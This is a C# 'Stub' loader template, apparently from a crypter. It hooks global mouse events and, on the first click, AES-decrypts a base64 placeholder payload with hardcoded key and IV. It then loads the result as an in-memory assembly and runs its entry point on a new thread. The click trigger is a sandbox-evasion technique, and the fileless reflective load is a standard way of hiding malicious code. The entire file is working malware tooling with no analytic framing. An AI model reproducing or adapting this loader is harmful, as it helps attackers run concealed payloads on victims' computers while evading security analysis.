using Gma.System.MouseKeyHook;
using System;
using System.IO;
using System.Reflection;

using System.Threading;
namespace Stub
{
    using System.Security.Cryptography;
    public class ClickDetector
    {
        static string DecryptStringFromBytes_Aes(byte[] cipherText, byte[] Key, byte[] IV)
        {
            string plaintext = null;
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Key;
                aesAlg.IV = IV;
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }
            }
            return plaintext;
        }

        public static void ListenForMouseEvents()
        {
            int firstTime = 0;
            //When a mouse button is pressed 
            Hook.GlobalEvents().MouseDown += async (sender, e) =>
            {
                if (firstTime == 0)
                {

                    firstTime++;
                    AppDomain tempDomain = AppDomain.CreateDomain("TempDomain");
                    tempDomain.DoCallBack(Load);
                    Hook.GlobalEvents().Dispose();
                }

            };
        }
        private static void Load()
        {

            String load = "YOUR ENCRYPTED BASE64 PAYLOAD";
            byte[] iv = new byte[] { 0x12, 0x2A, 0xF0, 0xA3, 0xA1, 0xBC, 0x12, 0x2A, 0xF0, 0xA3, 0xA1, 0xBC, 0x12, 0x2A, 0xF0, 0xA3 };
            byte[] key = new byte[] { 0x00, 0x21, 0x60, 0x1F, 0xA1, 0xFF, 0x00, 0x21, 0x60, 0x1F, 0xA1, 0xFF, 0x00, 0x21, 0x60, 0x1F };
            byte[] after = Convert.FromBase64String(load);
            string payloadBytes = DecryptStringFromBytes_Aes(after, key, iv);

            AppDomain domain = (AppDomain)typeof(Thread).GetMethod("GetDomain").Invoke(0, null);
            Assembly assembly = domain.Load(Convert.FromBase64String(payloadBytes));

            new Thread(() =>
            {
                assembly.EntryPoint.Invoke(0, null);

            }).Start();
        }
    }
}
